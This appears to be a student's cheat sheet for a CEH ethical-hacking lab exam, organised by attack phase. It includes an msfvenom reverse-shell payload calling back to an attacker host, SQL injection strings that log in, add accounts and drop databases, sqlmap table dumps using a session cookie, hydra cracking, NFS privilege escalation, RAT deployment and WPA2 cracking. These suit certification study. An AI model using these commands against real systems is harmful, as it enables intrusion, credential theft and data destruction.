QuickLinks

https://gtfobins.github.io/

https://crackstation.net/

https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers

https://medium.com/@kumarishefu.4507/try-hack-me-write-up-privilege-escalation-linux-privesc-nfs-capstone-challenge-dd69599dcbfa

https://github.com/carlospolop/PEASS-ng



First things first

> mkdir /var/www/html/share

> chmod -R 777 /var/www/html/share

> chown -R www-data:www-data /var/www/html/share

> service apache2 start

Use to xfer files from Parrot to Windows for DIE/Snow/Openstego analysis

# Reconnaissance/Scanning
## Identifying FQDN

## Common Ports

LDAP: 389
RDP: 3389
SMB: 445, 139
Android: 5555
FTP: 21

NFS: 2049



# Enumeration


# Vulnerability Research and Analysis

## Using OpenVAS (Parrot/Linux)

> Applications > Pentesting > Vul Analysis > Openvas - Greenbone > Start Greenbone Vul Manager Service 

Access link is **https://127.0.0.1:9392** , Username: admin, Password: password

> Scans > Task > Wizardy Wand thingy > Task Wizard > Enter target IP address > Start Scan


## Using Nikto to scan Web Servers/CGI Applications

> nikto -h [HOST NAME eg. https://www.certifiedhacker.com] -Tuning x -o [NAME OF OUTPUT FILE] -F [FORMAT OF OUTPUT FILE eg. txt]

## Dirb

> dirb [HOST] -w



# Steganography

OpenStego on Windows (Straightforward)


# Phone Exploitation (ADB:5555)

pip3 install colorama

python3 phonesploit.py

# System Hacking

## Password Cracking
1. L0phtcrack 7 (Windows Password Auditor/Cracker)
2. Hydra
    > hydra -l [Username] -P [Password list] [Victim IP] [Protocol. SMB, FTP etc]

# Exploitation

## Reverse Shell payloads

> msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP address of Attacker machine] LPORT=444 -o /home/attacker/Desk/FILENAME.exe



## Priv Escalation

**Command to look for list with SUID**

> find / -type f -perm -4000 [-ls if u want to list] 2>/dev/null

 **NFS**

1. > cat /etc/exports

If you spot "no_root_squash" in the content, means vulnerable to NFS

2. > showmount -e [VICTIM IP]

This enumerates for mountable shares

3. > mkdir /tmp/[NAME THE FOLDER URSELF]

> mount -o rw [VICTIM IP]:/[MOUNTABLE SHARE] /tmp/[FOLDER U NAMED AS ABOVE]

OR

> mount -t nfs [VICTIM IP}:/[MOUNTABLE SHARE] /tmp/[FOLDER U NAMED AS ABOVE]

4. > https://medium.com/@kumarishefu.4507/try-hack-me-write-up-privilege-escalation-linux-privesc-nfs-capstone-challenge-dd69599dcbfa




## SQL Injection

Standard
> ';or 1=1;--

Inserting values into SQL database. Able to log in after that.
> ';insert into login values ('john','apple123');--

Creating database.
> ';create database mydatabase;--

Deleting database.
> ';DROP DATABASE mydatabase;--

**SQLMAP**

Enumerate Databases
> sqlmap -u [URL after loggin in, with "id"] --cookie="[COOKIE FROM DOCUMENT.COOKIE]" --dbs

Enumerate Tables (Alternatively leave out -D to enumerate ALL tables)
> sqlmap -u [URL after loggin in, with "id"] --cookie="[COOKIE FROM DOCUMENT.COOKIE]" -D [DATABASE] --tables

Dump contents of table
> sqlmap -u [URL after loggin in, with "id"] --cookie="[COOKIE FROM DOCUMENT.COOKIE]" -D [DATABASE] -T [TABLE NAME] --dump
## Web Application/Server


https://github.com/BullsEye0/ghost_eye.git  (SERVER)

skipfish (More comprehensive than dirb)     (SERVER/APP)
> skipfish -o [OUTPUT DIR] [TARGET]

https://github.com/urbanadventurer/WhatWeb.git  (WEB APP)

dirsearch.py

HttpRecon (**Run as administrator**): E:\CEH-Tools\CEHv12 Module 13 Hacking Web Servers\Web Server Footprinting Tools\httprecon

Banner grabbing to obtain E-Tag
> nc -vv www.moviescope.com 80

> GET / HTTP/1.0   [PRESS ENTER TWICE]


Web Crawling and Spidering
> Try Skipfish and verify with OWASP ZAP (Select Automated mode from startup page)

# FTP Operations


# SMB Operations



# Malware 

## Analysis

1. For identifying entropy/Entry point:
 E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\DIE 

2. For identifying File Loc: E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\String Searching Tools\BinText 

## RAT (Attempt to Nmap for open RDP port 3389 first, and RDP inside)

1. **njRAT**

Navigate to CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans\njRAT\njRAT.exe
 
> Default port for njRAT 5552


2. **Theef RAT**

**ON VICTIM MACHINE**: Navigate to CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans\Theef\ **Server210.exe**

**ON ATTACKER MACHINE**: Navigate to CEHv12 Module 07 Malware Threats\Trojans Types\Remote Access Trojans\Theef\ **Client210.exe**

> Default port for Theef is ??




# Encryption

Veracrypt.

# Wireless Attacks Operations

aircrack-ng can be used for WEP or WPA2.cap files

WEP cap files

> aircrack-ng FILE.cap

WPA2 cap files

-a 2 represents mode 2 (WPA2)
-b is bssid (mac address) of the device. Can be found by looking at WPA2 cap file via wireshark.

> aircrack-ng -a 2 -b [BSSID] -w [WORDLIST PATH (/home/attacker/Desktop/Wordlist/password.txt)] WPA2FILE.cap




